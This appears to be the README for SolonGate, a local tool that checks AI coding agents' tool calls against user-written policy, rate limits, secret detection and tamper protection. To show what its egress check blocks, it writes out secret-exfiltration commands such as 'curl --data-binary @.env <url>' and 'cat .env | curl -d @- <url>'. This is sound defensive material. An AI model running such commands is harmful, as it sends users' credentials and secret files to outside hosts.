# SolonGate

A policy gate for AI coding agents. It sits in front of every tool call an agent
makes — every shell command, every file read, every write — and decides whether
it runs, against rules you wrote.

Everything is on the machine. The policy is a file, the audit trail is a file, and
nothing leaves: there is no service to sign in to, no account, and no code left in
the guard that can open a socket.

Supported agents: **Claude Code**, **Codex**, **OpenCode**, **Antigravity**.

## What is here

| | |
| --- | --- |
| `packages/guard-go` | The guard, in Go. Runs on every tool call and decides. |
| `packages/proxy` | The CLI, the TUI and the hooks (npm `@solongate/proxy`, command `solongate`). |
| `packages/proxy-go` | The same CLI in Go, which is what ships as the binary. |
| `packages/sgpolicy` | The Go policy engine: JSON rules → Rego, evaluated in process. |
| `packages/sgshared` | Shapes more than one program has to agree about. |

Two implementations of everything, deliberately. Which one decides a call depends
only on whether a machine has the Go binary, so they have to agree — and the
conformance suite runs against both to make sure they do.

## Getting started

```bash
npm i -g @solongate/proxy
solongate                    # the dataroom; install the guard from Settings
```

Start a new terminal afterwards. Hooks load when a session starts, so
already-open terminals are not guarded yet.

### From this checkout

The command above needs the published package. To run what is in this tree:

```bash
./install.sh
```

It checks the toolchain, installs the workspace, builds the TypeScript and this
host's Go binaries, and installs the guard, the hooks and the client
registrations. Then `solongate` is a command.

Open a new terminal afterwards, for the same reason as above.

**It will not run from an agent.** Every command in the CLI changes a security
posture, so the CLI requires a terminal on both stdin and stdout, and the guard
refuses a tool call that invokes it. Run `./install.sh` yourself: the build steps
work from anywhere, the install step is refused without a terminal and says so.

<details>
<summary>The same thing by hand</summary>

```bash
pnpm install
cd packages/proxy
pnpm build                                  # the CLI, the TUI and the hooks
pnpm build:go linux-x64                     # or your own: darwin-arm64, win32-x64, …
./platforms/linux-x64/solongate repair      # install, using the build you just made
```

`pnpm build:go` with no target builds all six, which takes a few minutes and is
what a release needs; one target is enough to try it.

`pnpm install` warns four times that it could not create a bin — `solongate`,
`solongate-proxy`, `proxy`, `solongate-audit`. It is linking commands at files
that `pnpm build` has not produced yet, and the next command produces them.
Nothing is wrong and nothing needs rerunning.

The last command is run by path on purpose. The `solongate` on PATH, if there is
one, is whatever was installed before — so asking it to install would install the
old version over the new one. After that one run, plain `solongate` is this build:
an install puts the binaries in `~/.solongate/bin`, which is where both the guard
hook and the launcher on PATH look for them.

</details>

## Write a policy

`~/.solongate/policy.json`:

```json
{
  "mode": "denylist",
  "rules": [
    {
      "id": "no-force-push",
      "description": "Rewriting shared history is not an agent's decision",
      "effect": "DENY",
      "priority": 10,
      "enabled": true,
      "toolPattern": "*",
      "minimumTrustLevel": "UNTRUSTED",
      "commandConstraints": { "denied": ["*push --force*", "*push -f*"] }
    }
  ]
}
```

The next tool call is decided against it: `git push --force` and `git push -f` are
refused from that point, `git push` is not. `solongate policy deny local --command '*push --force*'` writes the same thing
without the JSON.

**`denylist` allows what no rule forbids. `whitelist` refuses what no ALLOW rule
matches.** A DENY always wins over an ALLOW, whatever the priorities say — the
priority orders rules of the same effect.

A `policy.json` beside your working directory is read when the machine has no file
of its own. It may add **rules and nothing else**: it lives in a repository the
agent can write to, so `selfProtect` and `security` are ignored there.

## The other layers

They live in the same file. Wrap the policy and add `security`:

```json
{
  "policy": { "mode": "denylist", "rules": [] },
  "security": {
    "rateLimit": { "perMinute": 60, "perHour": 900, "perDay": 5000 },
    "dlpBlock": { "patterns": ["AWS access key", "Anthropic key"], "custom": [] },
    "localLogs": { "path": "/where/the/audit/trail/goes" }
  }
}
```

- **Rate limiting** — a cap per minute, hour or day. `rateLimitObserve` instead of
  `rateLimit` counts without blocking.
- **DLP** — when a call carries a secret, refuse it. `dlpBlock` refuses and masks;
  `dlpRedact` alone masks without refusing. 70 built-in patterns, and `custom`
  takes globs of your own. `solongate dlp` lists the names.
- **Egress** — a transfer command that would upload a local file holding a secret is
  refused, which pattern DLP cannot catch: `curl --data-binary @.env <url>` reads the
  file itself, so the secret never appears in the arguments or the output. It reads
  the file the command names, including a positional one (`scp .env host:/tmp`) and
  one piped in (`cat .env | curl -d @- <url>`). On with `dlpBlock`.
- **The prompt** — the model sees your typed prompt and whatever the client sweeps
  into context, and no tool-call hook is in that path. A shell shim routes `claude`
  through a local proxy that masks the request body on its way out; the response
  comes back untouched. Installed with the guard, using the same patterns —
  `custom` included.
- **Tamper protection** — the guard's own state is unreachable from a tool call, by
  every route, and cannot be switched off by a policy in a repository. On by
  default; `"selfProtect": false` beside `policy` turns it off.

## Where the record goes

`~/.solongate/local-logs/solongate-audit.jsonl`, owner-only, one JSON object per
line. The guard writes a denial before it answers the agent; the post-tool hook
writes the rest.

Recording is not optional — there is nowhere else for an entry to go — so
`localLogs.path` chooses the folder and nothing more. `solongate audit` reads the
file, and `solongate audit whitelist <id>` turns a line of it into a rule.

What a turn COST goes beside it, in `token-usage-<date>.jsonl`: one line per turn,
with the model and the turn id, read from whatever each client already records.
Nothing counts tokens for you and nothing is sent anywhere.

## The CLI

```
solongate                    the dataroom (policies, audit, settings)
solongate policy             list, create and edit the policy
solongate ratelimit          show and edit the rate limit
solongate dlp                show and edit secret detection
solongate audit              browse the audit trail
solongate watch              live-tail tool calls
solongate trace              what the guard saw in this directory
solongate stats              what has been recorded
solongate doctor             health check: policy file, guard, local logs
solongate repair             restore the guard, hooks and settings files
```

Every one of these reads or changes a security posture, so they refuse to run
without an interactive terminal and refuse when an agent marker is in the
environment. A prompt-injected agent must not be able to switch off the thing
watching it — and there is no environment variable that exempts anything from that
check.

## The MCP proxy

`solongate -- <upstream command>` puts the same policy in front of an MCP server's
tool calls, for an agent that speaks MCP rather than running hooks. It decides with
the same evaluator the guard uses (`packages/proxy/hooks/policy-eval.mjs`), so a
policy means one thing in both places.

**Almost all the layers are there.** This path enforces the policy rules, the rate
limit and DLP — the same scanner and the same pattern list the hooks use, so a
secret split across string literals does not walk past it either.

Egress is the exception, and for a reason rather than an omission: that check reads
the files a transfer command would upload, resolving them against the **agent's**
working directory. A proxy in front of a tool server has no such directory — the
paths in a call belong to whatever machine the upstream runs on — so reading them
here would read the wrong machine's files. The proxy prints which layers are in
force every time it starts, and says this plainly when your policy configures
egress, because a difference you cannot see is the kind that gets found the
expensive way.

## Developing

Go 1.25 and Node 20+.

```bash
pnpm install
pnpm build                    # every package, the way it ships
pnpm test                     # the conformance suite

# and the Go side, module by module
for m in guard-go proxy-go sgpolicy sgshared; do
  (cd packages/$m && gofmt -l . && go vet ./... && go test -count=1 ./...)
done
```

`-count=1` is not a habit, it is the fix for something that happened: Go serves a
cached PASS for a test whose subject was deleted elsewhere in the repo, and one sat
green that way for a while.

**The conformance suite is the contract.** It runs the guard as a subprocess, feeds
it a client payload, and asserts on the exit code, the files touched and what a
stub server does NOT receive — without importing any implementation's internals.

```bash
cd packages/proxy
pnpm build                    # the suite imports dist/, and drives the bundled hook

node test/run-all.mjs                                   # the Node hook
SG_HOOK=$PWD/../guard-go/solongate-guard \
  node test/run-all.mjs                                 # and the Go binary
```

`pnpm build` rather than `npx tsc`: tsc emits one .js per source file, which resolves
every import the suite has and is **not what ships** — the package ships tsup's
bundles, so a module the suite imports has to be an entry to survive the real build.
Two were not, and only a machine that had run `pnpm build` noticed. CI runs the same
command for the same reason.

Both, every time. The two implementations are meant to be indistinguishable, and
every divergence found so far was found by running the same suite against each:
the tamper globs disagreeing about `*`, the DLP list running 14 patterns against
70, an ALLOW beating a DENY in the Rego chain, and a `curl -d @creds.env` upload
that one blocked and the other allowed.

A change to the guard is correct exactly when this passes unchanged, against both.
Every case in it exists because the behaviour it pins was once wrong, and the
comments say which.

[ENGINEERING.md](ENGINEERING.md) is the rest: why Go, where the guard stands, and
the failure modes that cost somebody a day.

## Licence

MIT. See [LICENSE](LICENSE).
